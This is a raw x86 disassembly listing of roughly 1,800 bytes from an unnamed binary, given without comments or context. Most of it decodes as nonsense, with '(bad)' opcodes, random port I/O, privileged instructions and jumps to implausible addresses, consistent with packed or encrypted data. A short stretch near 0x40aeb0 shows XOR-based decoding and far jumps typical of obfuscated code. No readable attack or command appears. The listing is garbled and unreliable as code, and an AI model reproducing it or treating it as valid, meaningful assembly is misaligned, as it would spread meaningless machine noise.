  40a889:	enter  0x9a59,0xb6
  40a88d:	enter  0x7440,0x18
  40a891:	mov    edi,0x72555e9a
  40a896:	pop    ecx
  40a897:	sub    esi,ebx
  40a899:	and    DWORD PTR [edi],esi
  40a89b:	out    dx,eax
  40a89c:	nop
  40a89d:	xchg   ecx,eax
  40a89e:	sub    ebp,0xfffffffa
  40a8a1:	or     esi,esp
  40a8a3:	or     dl,BYTE PTR [ebp-0x195979f9]
  40a8a9:	icebp  
  40a8aa:	scas   al,BYTE PTR es:[edi]
  40a8ab:	sbb    dh,cl
  40a8ad:	mov    BYTE PTR [ebx+0x29ca0101],dh
  40a8b3:	daa    
  40a8b4:	add    BYTE PTR [ebp+0x59],ah
  40a8b7:	or     DWORD PTR [ebx+0x47],0x59bed5f2
  40a8be:	daa    
  40a8bf:	jl     0x40a86e
  40a8c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8c2:	pop    ebp
  40a8c3:	ror    BYTE PTR [ebp+0x52e3bbf3],0x12
  40a8ca:	adc    eax,0xf1884d34
  40a8cf:	in     al,0x42
  40a8d1:	ins    BYTE PTR es:[edi],dx
  40a8d2:	mov    dh,0x2a
  40a8d4:	(bad)  
  40a8d5:	pop    ecx
  40a8d6:	ss stos DWORD PTR es:[edi],eax
  40a8d8:	jmp    0x40a8af
  40a8da:	xchg   ecx,eax
  40a8db:	out    dx,al
  40a8dc:	cli    
  40a8dd:	rol    DWORD PTR [edi+0x76],0x16
  40a8e1:	fdiv   QWORD PTR [ebp+0x5ff17e4a]
  40a8e7:	shl    DWORD PTR [eax-0x5426fb6f],cl
  40a8ed:	pop    esi
  40a8ee:	test   eax,0xcdcb1fa7
  40a8f3:	cs popa 
  40a8f5:	xchg   esp,eax
  40a8f6:	cld    
  40a8f7:	sub    cl,BYTE PTR [eax]
  40a8f9:	mov    ds:0x86dda417,al
  40a8fe:	test   DWORD PTR [ebx+0x5855111f],ebx
  40a904:	ret    0x47
  40a907:	out    dx,eax
  40a908:	push   ebx
  40a909:	pop    edx
  40a90a:	jnp    0x40a92c
  40a90c:	jno    0x40a95d
  40a90e:	jg     0x40a935
  40a910:	lea    ebp,[esi]
  40a912:	pop    ss
  40a913:	(bad)  
  40a914:	lds    edx,FWORD PTR [eax-0x72]
  40a917:	dec    ebp
  40a918:	dec    esp
  40a919:	inc    edi
  40a91a:	cs (bad) 
  40a91c:	in     al,0x5e
  40a91e:	add    bl,BYTE PTR [edi+0x2b86a023]
  40a924:	pop    edi
  40a925:	dec    dh
  40a927:	(bad)  
  40a928:	(bad)  
  40a929:	out    dx,al
  40a92a:	sub    BYTE PTR [edx-0x59],dh
  40a92d:	xor    DWORD PTR [esi-0x34ce64a9],ebp
  40a933:	sub    ecx,DWORD PTR [edi+0x4a767d7]
  40a939:	push   ss
  40a93a:	pushf  
  40a93b:	mul    DWORD PTR [ebp-0x38]
  40a93e:	pusha  
  40a93f:	jnp    0x40a909
  40a941:	or     DWORD PTR [edi+esi*2],edx
  40a944:	sub    eax,0x1780cbe1
  40a949:	sub    al,0x4e
  40a94b:	mov    bl,0x3c
  40a94d:	push   ebx
  40a94e:	fimul  WORD PTR [eax-0x4e249ab7]
  40a954:	aam    0x5d
  40a956:	jo     0x40a94d
  40a958:	repz xchg esi,eax
  40a95a:	or     eax,0x7012cb1
  40a95f:	jmp    0x3742a4c9
  40a964:	sub    al,0x95
  40a966:	dec    esi
  40a967:	loop   0x40a9a4
  40a969:	mov    al,ds:0xe006a2d0
  40a96e:	outs   dx,BYTE PTR cs:[esi]
  40a970:	sbb    DWORD PTR [eax],ebx
  40a972:	cmp    DWORD PTR [edi+0x50ade7f5],ecx
  40a978:	cli    
  40a979:	adc    bh,BYTE PTR [edi]
  40a97b:	mov    es,WORD PTR [edx]
  40a97d:	mov    ah,0xe3
  40a97f:	push   esp
  40a980:	ins    BYTE PTR es:[edi],dx
  40a981:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a982:	gs mov ch,0x3a
  40a985:	mov    cl,0x70
  40a987:	push   ds
  40a988:	cdq    
  40a989:	outs   dx,BYTE PTR ds:[esi]
  40a98a:	stos   BYTE PTR es:[edi],al
  40a98b:	es or  eax,0xaa7779ca
  40a991:	in     eax,dx
  40a992:	mov    edi,0xa21af4dd
  40a997:	pop    eax
  40a998:	pusha  
  40a999:	push   edi
  40a99a:	scas   al,BYTE PTR es:[edi]
  40a99b:	test   al,0x34
  40a99d:	mov    ecx,0xc0fa8378
  40a9a2:	jecxz  0x40a98d
  40a9a4:	out    0x12,al
  40a9a6:	lock push ebp
  40a9a8:	and    DWORD PTR [edi],ebx
  40a9aa:	inc    ebx
  40a9ab:	add    eax,0x102f7226
  40a9b0:	lods   al,BYTE PTR ds:[esi]
  40a9b1:	aaa    
  40a9b2:	bound  eax,QWORD PTR [eax+0x77]
  40a9b5:	jl     0x40a986
  40a9b7:	cmp    edx,DWORD PTR [ebp-0x4e]
  40a9ba:	jle    0x40a97e
  40a9bc:	cld    
  40a9bd:	and    dl,BYTE PTR [eax-0x1a7b210c]
  40a9c3:	(bad)  
  40a9c4:	push   ebx
  40a9c5:	scas   eax,DWORD PTR es:[edi]
  40a9c6:	push   ds
  40a9c7:	mov    bh,0xb
  40a9c9:	sar    BYTE PTR [edi],0x8d
  40a9cc:	in     al,dx
  40a9cd:	dec    esp
  40a9ce:	mov    dl,BYTE PTR [ecx-0x4d]
  40a9d1:	stos   BYTE PTR es:[edi],al
  40a9d2:	adc    al,0xd9
  40a9d4:	jo     0x40a9f2
  40a9d6:	sub    BYTE PTR [edi+0x3d8e69af],ch
  40a9dc:	adc    DWORD PTR [esi-0x36],0x8c0350a1
  40a9e3:	leave  
  40a9e4:	or     al,0xad
  40a9e6:	sub    BYTE PTR ds:0xd6cae738,al
  40a9ec:	je     0x40aa0c
  40a9ee:	xchg   ecx,eax
  40a9ef:	push   ecx
  40a9f0:	fistp  WORD PTR [ecx]
  40a9f2:	mov    dl,0x6d
  40a9f4:	cmp    DWORD PTR [esi],edi
  40a9f6:	ds jbe 0x40aa65
  40a9f9:	aad    0x86
  40a9fb:	pusha  
  40a9fc:	mov    WORD PTR [ebp+0x57],?
  40a9ff:	push   ds
  40aa00:	push   ebp
  40aa01:	cmp    DWORD PTR [ecx],0x6f
  40aa04:	ret    
  40aa05:	and    eax,DWORD PTR [ebp+0x57]
  40aa08:	test   BYTE PTR [ecx+0x11b8c58d],dl
  40aa0e:	icebp  
  40aa0f:	(bad)  
  40aa10:	pop    ebp
  40aa11:	adc    bh,al
  40aa13:	test   al,0x40
  40aa15:	cmp    al,0xdf
  40aa17:	lods   eax,DWORD PTR ds:[esi]
  40aa18:	sub    BYTE PTR [ebx+0x5a],0x8a
  40aa1c:	mov    esp,ebx
  40aa1e:	mov    bl,0x62
  40aa20:	mov    bl,BYTE PTR [ebx-0x2abb4491]
  40aa26:	ret    0xaefc
  40aa29:	ror    BYTE PTR [edx+0x8],1
  40aa2c:	mov    DWORD PTR [edi+0x31],edx
  40aa2f:	in     eax,0xd0
  40aa31:	mov    edi,0x9915bee1
  40aa36:	pop    esi
  40aa38:	sti    
  40aa39:	pop    esi
  40aa3a:	push   eax
  40aa3b:	mov    esp,DWORD PTR [ebx-0x5b26d9c0]
  40aa41:	(bad)  
  40aa42:	push   ds
  40aa43:	aam    0xf7
  40aa45:	dec    eax
  40aa46:	fsubr  QWORD PTR [eax-0x6430fafd]
  40aa4c:	jp     0x40aa74
  40aa4e:	inc    eax
  40aa4f:	not    DWORD PTR [edx+0x394d979c]
  40aa55:	lock int3 
  40aa57:	mov    ds:0xc838f979,eax
  40aa5c:	push   esi
  40aa5d:	test   edx,eax
  40aa5f:	push   edx
  40aa60:	cmp    DWORD PTR [ebx+0x5],0x13e5afbf
  40aa67:	test   al,0x40
  40aa69:	rol    cl,1
  40aa6b:	mov    edx,0x77bc4ce9
  40aa70:	xchg   dh,ch
  40aa72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa73:	ror    DWORD PTR ds:0xb3738962,cl
  40aa79:	add    ah,0x8d
  40aa7c:	cli    
  40aa7d:	sbb    al,0xc6
  40aa7f:	xchg   BYTE PTR [edi],cl
  40aa81:	push   ebp
  40aa82:	dec    eax
  40aa83:	or     esp,ebp
  40aa85:	pop    es
  40aa86:	fild   DWORD PTR [edx+eax*4+0xc]
  40aa8a:	in     eax,0xda
  40aa8c:	ficomp WORD PTR [ebp+0x27]
  40aa8f:	sbb    DWORD PTR [eax+edx*2-0x50],0xed3e99b8
  40aa97:	or     al,BYTE PTR [edi-0x35]
  40aa9a:	data16 ja 0x40aaa1
  40aa9d:	hlt    
  40aa9e:	push   ss
  40aa9f:	pop    ss
  40aaa0:	shl    DWORD PTR [ecx+0x2d],1
  40aaa3:	xchg   ebx,eax
  40aaa4:	sub    al,0xa7
  40aaa6:	dec    edx
  40aaa7:	das    
  40aaa8:	push   0xd47fa27c
  40aaad:	arpl   WORD PTR [edi+0x5c],bx
  40aab0:	dec    edx
  40aab1:	add    al,0xfa
  40aab3:	popa   
  40aab4:	jne    0x40aaaf
  40aab6:	out    dx,eax
  40aab7:	jle    0x40aa3c
  40aab9:	lea    ebp,[edx-0x2d54026f]
  40aabf:	out    0xd7,al
  40aac1:	xchg   edi,eax
  40aac2:	jmp    0x40aa5f
  40aac4:	(bad)  
  40aac5:	test   al,0xc4
  40aac7:	and    BYTE PTR [edi],bh
  40aac9:	fmul   st(6),st
  40aacb:	adc    al,0xd0
  40aacd:	pushw  0x77
  40aad0:	repz jmp 0x5c64a96d
  40aad6:	not    DWORD PTR [edx]
  40aad8:	in     al,0xa
  40aada:	pop    ebx
  40aadb:	rcr    BYTE PTR [ecx+0x26],1
  40aade:	add    al,0xb0
  40aae0:	mov    edx,0x8cb2182c
  40aae5:	adc    esi,ecx
  40aae7:	out    dx,al
  40aae8:	push   ecx
  40aae9:	mov    DWORD PTR fs:[ebp+0x9f26cad],ebx
  40aaf0:	and    cl,ah
  40aaf2:	mov    bh,0x93
  40aaf4:	test   dl,dl
  40aaf6:	sub    dh,dl
  40aaf8:	bound  ecx,QWORD PTR [edx-0x1d8f2a0e]
  40aafe:	sub    BYTE PTR [ebp-0xedb52d9],dh
  40ab04:	fst    QWORD PTR [esi+0x27]
  40ab07:	sub    al,0x1f
  40ab09:	push   esi
  40ab0a:	aam    0xa2
  40ab0c:	inc    ecx
  40ab0d:	test   al,0xae
  40ab0f:	jns    0x40ab7a
  40ab11:	adc    DWORD PTR [edi],ecx
  40ab13:	jbe    0x40ab05
  40ab15:	ss cmc 
  40ab17:	xchg   ebx,eax
  40ab18:	popf   
  40ab19:	mov    ch,0xa0
  40ab1b:	mov    ebx,ds
  40ab1d:	scas   eax,DWORD PTR es:[edi]
  40ab1e:	mov    bl,0xe6
  40ab20:	jge    0x40aad8
  40ab22:	jb     0x40ab11
  40ab24:	sbb    eax,DWORD PTR [eax]
  40ab26:	repnz ror DWORD PTR [bx+0x7e7],0x73
  40ab2d:	aas    
  40ab2e:	mov    BYTE PTR [edx-0x29],bl
  40ab31:	dec    edx
  40ab32:	xchg   esp,eax
  40ab33:	dec    edi
  40ab34:	sar    DWORD PTR [eax],0x18
  40ab37:	add    DWORD PTR [ebp+0xafd7d7c],ebx
  40ab3d:	mov    dh,0x54
  40ab3f:	les    ecx,FWORD PTR [edi+0x7d]
  40ab42:	push   ebp
  40ab43:	jo     0x40aae1
  40ab45:	pop    ebp
  40ab46:	sahf   
  40ab47:	adc    esp,edi
  40ab49:	arpl   WORD PTR [ebp+0x64],si
  40ab4c:	mov    ebx,0xd8b5b14f
  40ab51:	push   esi
  40ab52:	popw   ss
  40ab54:	adc    bl,BYTE PTR [edx-0x3fa43ee6]
  40ab5a:	add    esp,ecx
  40ab5c:	inc    ebp
  40ab5d:	div    BYTE PTR [ebp-0x1b362dad]
  40ab63:	cdq    
  40ab64:	pop    es
  40ab65:	js     0x40ab67
  40ab67:	out    dx,al
  40ab68:	clc    
  40ab69:	mov    dh,0xd8
  40ab6b:	adc    al,0x3
  40ab6d:	add    esi,eax
  40ab6f:	inc    esi
  40ab70:	cmp    DWORD PTR [ebx-0x2d],eax
  40ab73:	jecxz  0x40ab47
  40ab75:	pop    edi
  40ab76:	outs   dx,DWORD PTR ds:[esi]
  40ab77:	push   0xb8f06ccc
  40ab7c:	test   BYTE PTR [edi],ah
  40ab7e:	adc    al,0x88
  40ab80:	ds (bad) 
  40ab82:	loop   0x40ab63
  40ab84:	fmul   QWORD PTR [edi+0x7b]
  40ab87:	into   
  40ab88:	rcr    BYTE PTR [edi+0x5c8f6a6d],0xa1
  40ab8f:	inc    esp
  40ab90:	jns    0x40abed
  40ab92:	clc    
  40ab93:	dec    ebp
  40ab94:	shl    DWORD PTR gs:[esi-0x62],cl
  40ab98:	aam    0x8f
  40ab9a:	ins    BYTE PTR es:[edi],dx
  40ab9b:	fisubr WORD PTR [esi]
  40ab9d:	not    DWORD PTR [ebp+edi*8-0x5c5f01fb]
  40aba4:	xor    esi,esp
  40aba6:	sbb    ah,BYTE PTR [edx-0x3095fe3a]
  40abac:	mov    ds,WORD PTR [edx]
  40abae:	pop    edx
  40abaf:	pop    es
  40abb0:	lods   al,BYTE PTR ds:[esi]
  40abb1:	push   ds
  40abb2:	xchg   ebp,eax
  40abb3:	jnp    0x40ac1a
  40abb5:	pusha  
  40abb6:	imul   DWORD PTR [edi+0x71aeeff4]
  40abbc:	repnz add DWORD PTR [edi+edi*4+0x37],edi
  40abc1:	jb     0x40abcd
  40abc3:	or     dh,BYTE PTR [edx+ebx*1]
  40abc6:	sbb    esp,esp
  40abc8:	scas   al,BYTE PTR es:[edi]
  40abc9:	or     DWORD PTR [edx+ecx*2-0x124edf6],esp
  40abd0:	(bad)  
  40abd1:	bnd jg 0x40ab8f
  40abd4:	and    DWORD PTR [edi+0x5b],edx
  40abd7:	cmp    esp,ecx
  40abd9:	inc    esi
  40abda:	push   ecx
  40abdb:	js     0x40ab84
  40abdd:	aaa    
  40abde:	mov    dh,BYTE PTR [edx+0x11]
  40abe1:	test   al,bl
  40abe3:	or     eax,0x897d5ab3
  40abe8:	pop    esp
  40abe9:	adc    al,0x23
  40abeb:	mov    bh,0x28
  40abed:	mov    al,ds:0xb49f2779
  40abf2:	dec    ebp
  40abf3:	sbb    al,BYTE PTR [edi+0x5f]
  40abf6:	stos   BYTE PTR es:[edi],al
  40abf7:	add    eax,0xcae0cdd4
  40abfc:	jl     0x40abf2
  40abfe:	jo     0x40abf2
  40ac00:	inc    edi
  40ac01:	lds    ebp,FWORD PTR [edi-0x292e58bc]
  40ac07:	aaa    
  40ac08:	push   esi
  40ac09:	ret    0x4066
  40ac0c:	push   esp
  40ac0d:	paddusw mm0,QWORD PTR [ebx-0x4f]
  40ac11:	jecxz  0x40abab
  40ac13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac14:	inc    edi
  40ac15:	ds lahf 
  40ac17:	push   0x338db782
  40ac1c:	clc    
  40ac1d:	mov    esi,0xb13bf2d9
  40ac22:	mov    bl,0x92
  40ac24:	shr    DWORD PTR [bx+si-0x6d],1
  40ac28:	mov    ebx,0x3fd607a2
  40ac2d:	and    DWORD PTR [edi],0xbfe39b5d
  40ac33:	sub    al,0x75
  40ac35:	xchg   BYTE PTR [edi-0x22],bh
  40ac38:	popf   
  40ac39:	dec    ebp
  40ac3a:	bound  esi,QWORD PTR [ecx-0x71]
  40ac3d:	out    0x86,eax
  40ac3f:	mov    bh,0x2d
  40ac41:	jl     0x40ac38
  40ac43:	sbb    BYTE PTR [eax+0x75bb0eba],dl
  40ac49:	scas   eax,DWORD PTR es:[edi]
  40ac4a:	add    BYTE PTR [eax-0x3c777cb8],bh
  40ac50:	(bad)  
  40ac51:	and    eax,0x24e831b
  40ac56:	cmp    BYTE PTR ds:0xc1201eef,dh
  40ac5c:	add    esp,DWORD PTR [edx+0x4c20b006]
  40ac62:	call   0x9d61:0x4751fc35
  40ac69:	mov    esi,0xcb8bd1b2
  40ac6e:	ret    0xa025
  40ac71:	mov    dl,0xc8
  40ac73:	fs mov ecx,0xca94c6e2
  40ac79:	or     al,0x8f
  40ac7b:	sar    BYTE PTR [ebx-0x6c],cl
  40ac7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac7f:	cmp    eax,0xf7e648e0
  40ac84:	or     eax,0xee2537e6
  40ac89:	les    eax,FWORD PTR [ecx-0x2f]
  40ac8c:	and    dh,BYTE PTR [ebx+0x6cf59a9b]
  40ac92:	sahf   
  40ac93:	mov    cl,0x1b
  40ac95:	adc    eax,0x75e24277
  40ac9a:	int3   
  40ac9b:	xor    al,ah
  40ac9d:	pop    edi
  40ac9e:	mov    edx,0x6df49d7b
  40aca3:	out    0x30,al
  40aca5:	shl    BYTE PTR [ebx+0x12],cl
  40aca8:	and    dl,0xa5
  40acab:	inc    ebx
  40acac:	(bad)  
  40acad:	push   ebx
  40acae:	mov    edx,0xb86daf3a
  40acb3:	out    dx,eax
  40acb4:	mov    ds:0xdf04f41c,eax
  40acb9:	cs fucomip st,st(3)
  40acbc:	test   BYTE PTR [edi],al
  40acbe:	psubb  mm6,QWORD PTR [ecx+ebx*1]
  40acc2:	xor    ax,0xbba8
  40acc6:	mov    al,0x71
  40acc8:	jne    0x40acfa
  40acca:	icebp  
  40accb:	add    BYTE PTR [edx+0x7d],ah
  40acce:	fwait
  40accf:	mov    al,ds:0x523b104e
  40acd4:	(bad)  
  40acd5:	mul    DWORD PTR [eax+0x1a]
  40acd8:	push   ebp
  40acd9:	in     eax,0xed
  40acdb:	cs in  eax,0x54
  40acde:	and    eax,0xaa1807ee
  40ace3:	cdq    
  40ace4:	jne    0x40ac93
  40ace6:	add    eax,0xbfc75d39
  40aceb:	cmp    al,0xb0
  40aced:	inc    edi
  40acee:	cmc    
  40acef:	xchg   ebx,eax
  40acf0:	pop    esp
  40acf1:	mov    ah,0x5d
  40acf3:	idiv   DWORD PTR [eax+0x40e7fea7]
  40acf9:	xchg   edx,eax
  40acfa:	jbe    0x40ac8c
  40acfc:	mov    ch,BYTE PTR [ebx-0x5b0a52b2]
  40ad02:	jecxz  0x40acf2
  40ad04:	stos   BYTE PTR es:[edi],al
  40ad05:	sbb    al,0xbe
  40ad07:	sbb    al,0xbc
  40ad09:	ins    DWORD PTR es:[edi],dx
  40ad0a:	lea    eax,[ecx+eiz*4+0x77]
  40ad0e:	mov    ecx,0x92b6cb37
  40ad13:	dec    edi
  40ad14:	mov    edx,0x31f4f23f
  40ad19:	add    BYTE PTR [ecx-0x1e],0x22
  40ad1d:	shl    BYTE PTR [edx],cl
  40ad1f:	dec    eax
  40ad20:	bound  ebp,QWORD PTR [ecx+0x3017e76a]
  40ad26:	pop    eax
  40ad27:	(bad)  
  40ad28:	cld    
  40ad29:	pop    edi
  40ad2a:	mul    DWORD PTR [esi]
  40ad2c:	pop    esp
  40ad2d:	mov    edx,0xcb3d7e3d
  40ad32:	leave  
  40ad33:	pop    esi
  40ad34:	push   edx
  40ad35:	loopne 0x40ad98
  40ad37:	ds mov edi,0xf575c0c9
  40ad3d:	outs   dx,DWORD PTR ds:[esi]
  40ad3e:	stos   DWORD PTR es:[edi],eax
  40ad3f:	inc    ecx
  40ad40:	mov    ah,0x9
  40ad42:	ror    BYTE PTR [edx+0x7c9ef9f7],1
  40ad48:	aaa    
  40ad49:	mov    es,WORD PTR [edi-0x6f55faea]
  40ad4f:	push   edx
  40ad50:	sbb    eax,0x5605ad16
  40ad55:	lods   eax,DWORD PTR ds:[esi]
  40ad56:	inc    eax
  40ad57:	test   DWORD PTR [ebx+0x2ff6cf8f],0x73310677
  40ad61:	xchg   ebp,eax
  40ad62:	mov    ch,0x94
  40ad64:	adc    eax,0x56736395
  40ad69:	bound  edi,QWORD PTR [esp+ecx*2-0x45a7a587]
  40ad70:	mov    bh,BYTE PTR [esi+0x5a]
  40ad73:	rcl    BYTE PTR [eax+edx*1-0x66],0xa7
  40ad78:	jne    0x40ad4a
  40ad7a:	sub    BYTE PTR [ecx-0x23c49c64],0xa0
  40ad81:	or     DWORD PTR ds:0x3b647d38,esp
  40ad87:	pop    ecx
  40ad88:	mov    edx,DWORD PTR [ecx]
  40ad8a:	and    BYTE PTR cs:[ebp+ebp*2-0x2c6f9d2b],ah
  40ad92:	mov    cl,0xb4
  40ad94:	aaa    
  40ad95:	and    bl,BYTE PTR ds:0xe36ed879
  40ad9b:	xchg   ebp,eax
  40ad9c:	dec    ecx
  40ad9d:	sar    DWORD PTR [eax-0x61],1
  40ada0:	fsub   st(2),st
  40ada2:	inc    esp
  40ada3:	shl    DWORD PTR [ebx+0x4b],1
  40ada6:	jbe    0x40ad9b
  40ada8:	inc    ecx
  40adaa:	fxam   
  40adac:	cld    
  40adad:	mov    ds:0x4a6003ee,al
  40adb2:	mov    ah,0xc4
  40adb4:	(bad)  
  40adb5:	sti    
  40adb6:	scas   al,BYTE PTR es:[edi]
  40adb7:	mov    edx,0xaa2311e1
  40adbc:	nop
  40adbd:	xchg   esi,eax
  40adbe:	xor    al,0xec
  40adc0:	sahf   
  40adc1:	test   DWORD PTR [eax],edi
  40adc3:	stos   BYTE PTR es:[edi],al
  40adc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40adc5:	nop
  40adc6:	(bad)  
  40adc7:	sbb    eax,0x174fb53e
  40adcc:	and    esp,eax
  40adce:	xlat   BYTE PTR ds:[ebx]
  40adcf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40add0:	gs jns 0x40ad9a
  40add3:	daa    
  40add4:	mov    ecx,0x137c8919
  40add9:	sub    ax,WORD PTR [edi]
  40addc:	das    
  40addd:	fsubr  DWORD PTR [edx]
  40addf:	mov    al,0x38
  40ade1:	test   DWORD PTR [edx],esi
  40ade3:	aaa    
  40ade4:	mov    ebx,0x634b9807
  40ade9:	jmp    0x40ad7d
  40adeb:	jae    0x40adf8
  40aded:	retf   
  40adee:	into   
  40adef:	fs or  eax,0x52d63073
  40adf5:	xchg   DWORD PTR [eax],edi
  40adf7:	mov    ?,ecx
  40adf9:	adc    eax,DWORD PTR [ebp+0x4d6f2833]
  40adff:	fisttp WORD PTR [edx+0x530e935b]
  40ae05:	fsub   QWORD PTR [edx]
  40ae07:	ja     0x40ae3e
  40ae09:	inc    esi
  40ae0a:	and    eax,0x3aafefc8
  40ae0f:	jns    0x40adab
  40ae11:	mov    DWORD PTR ds:0x968d4e2c,0xc4898a84
  40ae1b:	fwait
  40ae1c:	cdq    
  40ae1d:	sbb    BYTE PTR [edi],0x84
  40ae20:	add    ebp,eax
  40ae22:	(bad)  
  40ae23:	xor    BYTE PTR [eax+0x34c5c563],al
  40ae29:	(bad)  
  40ae2a:	and    dh,BYTE PTR [edx+0x6f]
  40ae2d:	into   
  40ae2e:	sti    
  40ae2f:	in     eax,dx
  40ae30:	pop    ecx
  40ae31:	loopne 0x40ae10
  40ae33:	xor    ebx,eax
  40ae35:	cwde   
  40ae36:	gs mov esp,0x59cf6f59
  40ae3c:	cwde   
  40ae3d:	test   al,0xa0
  40ae3f:	retf   
  40ae40:	push   edx
  40ae41:	xchg   ebp,eax
  40ae42:	mov    esp,0x96e9413a
  40ae47:	daa    
  40ae48:	sub    dh,BYTE PTR [edx]
  40ae4a:	fimul  WORD PTR [edx+0x5d]
  40ae4d:	out    0x66,eax
  40ae4f:	sub    dh,BYTE PTR [ebp-0x29]
  40ae52:	or     eax,0x52ed2b16
  40ae57:	ret    
  40ae58:	(bad)  
  40ae59:	mov    gs:0xeeee78b5,eax
  40ae5f:	not    esp
  40ae61:	into   
  40ae62:	sbb    ecx,DWORD PTR [edi+ebp*8]
  40ae65:	sbb    eax,0x81132ed7
  40ae6a:	mov    al,0x7b
  40ae6c:	mov    al,0xea
  40ae6e:	sbb    DWORD PTR [edi+0x5f],ebx
  40ae71:	pop    edi
  40ae72:	sbb    cl,bl
  40ae74:	and    ah,BYTE PTR [ebx+0x46bfe4ae]
  40ae7a:	iret   
  40ae7b:	inc    esp
  40ae7c:	xor    cl,BYTE PTR [ebx-0x4c28bd62]
  40ae82:	dec    esi
  40ae83:	inc    esi
  40ae84:	fs enter 0x3fe9,0xa6
  40ae89:	dec    esp
  40ae8a:	addr16 cdq 
  40ae8c:	loope  0x40ae2f
  40ae8e:	call   0x5da88986
  40ae93:	(bad)  
  40ae94:	sbb    DWORD PTR [ecx+0x6784e8ff],0xb340867e
  40ae9e:	cwde   
  40ae9f:	mov    ds,WORD PTR [esi+0x1c]
  40aea2:	loopne 0x40aeaf
  40aea4:	sub    BYTE PTR [eax],bh
  40aea6:	int    0xf1
  40aea8:	mov    ebx,0x4b70fda
  40aeae:	pop    eax
  40aeaf:	mov    ecx,DWORD PTR [ebp-0x14]
  40aeb2:	mov    eax,DWORD PTR [ecx+eax*4]
  40aeb5:	mov    DWORD PTR [ebp-0x38],eax
  40aeb8:	jmp    0x408aae
  40aebd:	mov    eax,DWORD PTR [ebp-0xc]
  40aec0:	xor    eax,esi
  40aec2:	lea    ebx,[ebx+eax*1+0x3272fa]
  40aec9:	jmp    0x4087a7
  40aece:	mov    eax,DWORD PTR [ebp-0x4]
  40aed1:	xor    eax,esi
  40aed3:	add    eax,edi
  40aed5:	jmp    0x40d3b1
  40aeda:	mov    eax,DWORD PTR [ebp-0x38]
  40aedd:	add    eax,DWORD PTR [ebp+0x8]
  40aee0:	mov    DWORD PTR [ebp-0x18],eax
  40aee3:	jmp    0x40d298
  40aee8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aee9:	fisubr WORD PTR [esi]
  40aeeb:	jbe    0x40af63
  40aeed:	jbe    0x40aed6
  40aeef:	outs   dx,BYTE PTR ds:[esi]
  40aef0:	xchg   BYTE PTR [ebx-0x3f0358d0],al
  40aef6:	mov    eax,ds:0x7b0982ad
  40aefb:	jnp    0x40af10
  40aefd:	pushf  
  40aefe:	jnp    0x40af7b
  40af00:	mov    ecx,edx
  40af02:	add    eax,0xd89d09a1
  40af07:	mov    ecx,0xb6f8276a
  40af0c:	dec    esp
  40af0d:	sub    al,0xa7
  40af0f:	sub    al,0x88
  40af11:	add    esi,DWORD PTR [ebp+0x33]
  40af14:	xchg   edx,eax
  40af15:	loope  0x40af2e
  40af17:	into   
  40af18:	jns    0x40ae9f
  40af1a:	sbb    eax,0x987a8db
  40af1f:	jb     0x40aecc
  40af21:	dec    esi
  40af22:	ret    0x27b1
  40af25:	sar    BYTE PTR ds:0x83c000ae,1
  40af2b:	jmp    0x9002:0x2b670cbd
  40af32:	mov    al,ds:0xbac9301d
  40af37:	mov    esi,0x8dae1b8f
  40af3c:	dec    esi
  40af3d:	adc    ebx,DWORD PTR [edi]
  40af3f:	(bad)  
  40af40:	cmp    eax,0x2e40c113
  40af45:	fcmovbe st,st(3)
  40af47:	inc    eax
  40af48:	test   BYTE PTR [ebp-0x56],bl
  40af4b:	jns    0x40aed7
  40af4d:	dec    eax
  40af4e:	push   ebx
  40af4f:	cdq    
  40af50:	and    cl,BYTE PTR [edx+0x5e6a32d0]
  40af56:	xor    al,ah
  40af58:	add    al,bh
  40af5a:	jecxz  0x40af52
  40af5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af5d:	out    dx,al
  40af5e:	push   esp
  40af5f:	shl    BYTE PTR [eax],1
  40af61:	xchg   ebp,eax
  40af62:	mov    edi,0xc57d79d4
  40af67:	xor    al,0xe2
  40af69:	and    al,0xf6
  40af6b:	sar    DWORD PTR [ecx],1
  40af6d:	popf   
  40af6e:	aas    
  40af6f:	rcl    BYTE PTR [eax],1
  40af71:	xor    DWORD PTR [ebx],edi
  40af73:	hlt    
  40af74:	or     DWORD PTR [ebp-0x37],edi
  40af77:	rol    DWORD PTR [esi+ecx*2-0x58],cl
  40af7b:	lock cmp eax,0x1ab85488
  40af81:	ret    
  40af82:	mov    ch,0xf6
  40af84:	call   DWORD PTR [ecx*2-0x79a13fa6]
  40af8b:	cmp    DWORD PTR [ebx-0x39],esi
  40af8e:	test   esp,edx
  40af90:	ins    BYTE PTR es:[edi],dx
  40af91:	(bad)  
  40af92:	outs   dx,BYTE PTR ds:[esi]
  40af93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af94:	inc    ecx
  40af95:	or     eax,0x683000e
  40af9a:	sbb    DWORD PTR [eax-0x61],eax
  40af9d:	dec    edx
  40af9e:	cmp    BYTE PTR [ecx+0x5c6d8e55],bl
  40afa4:	daa    
  40afa5:	or     eax,edi
  40afa7:	xchg   DWORD PTR [ecx+0x27a10a7a],esi
  40afad:	mov    bh,0xc9
  40afaf:	mov    DWORD PTR [edx],ebx
  40afb1:	cld    
  40afb2:	xor    dl,BYTE PTR [ecx]
  40afb4:	push   ebx
  40afb5:	mov    ds:0x55f90202,eax
  40afba:	push   eax
  40afbb:	xor    al,0xca
  40afbd:	bound  ebp,QWORD PTR [edi-0x20]
  40afc0:	add    al,0x59
  40afc2:	or     cl,BYTE PTR [edx+0x70d959b9]
  40afc8:	sbb    BYTE PTR [ecx],ch
  40afca:	or     DWORD PTR [ebp-0x26],esi
  40afcd:	arpl   WORD PTR [eax+0x5f],si
  40afd0:	jp     0x40b036
  40afd2:	pop    esp
  40afd3:	into   
  40afd4:	inc    ebx
  40afd5:	je     0x40b009
  40afd7:	or     BYTE PTR [edx+0x28],dl
  40afda:	mov    dl,0x67
  40afdc:	fldenv [ebx+esi*8+0x632868ff]
  40afe3:	call   0xcb31b46f
  40afe8:	dec    esp
  40afe9:	es jle 0x40afb7
  40afec:	sub    DWORD PTR [edi+0x41],eax
  40afef:	cmc    
  40aff0:	mov    ah,0xd1
